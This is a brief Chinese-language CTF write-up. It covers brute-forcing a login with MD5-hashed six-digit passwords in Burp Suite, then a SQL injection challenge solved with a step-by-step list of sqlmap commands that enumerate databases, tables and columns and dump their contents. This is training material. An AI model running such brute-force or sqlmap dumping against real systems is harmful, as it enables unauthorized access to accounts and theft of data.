1、登入试试

按题目描述用户名为Syclover，密码为以774开头的六位密码，我们就可以先用c语言写个代码得到全部密码结果

得到所有密码结果后，我们就可以用bp爆破密码了

刚开始没注意看，一直用纯数字爆，没有加密，楞是爆了半天没爆出来，人都傻了，后面去查看了题目网页的源代码

发现密码要进行md5加密，让我们加密后再试试


成功得到flag

2、Welcome SQL

整体过程和sqli-lab靶场的第二关一模一样，所以参考上篇博客就好了。
再补充一种方法：
sqlmap
1、先输入

python sqlmap.py

启动sqlmap
2、判断是否存在注入

python sqlmap.py -u url

没爆红就是有注入

3.爆数据库名

sqlmap.py -u url --dbs

或者使用下列代码直接爆当前数据库名

sqlmap.py -u url --current-db


4.爆表名

sqlmap.py -u url -D 数据库名 --tables


5.爆列名

sqlmap.py -u url -D 数据库名 -T 表名 --columns


6.爆字段内容

sqlmap.py -u url -D 数据库名 -T 表明 -C 列名 --dump


得到flag。
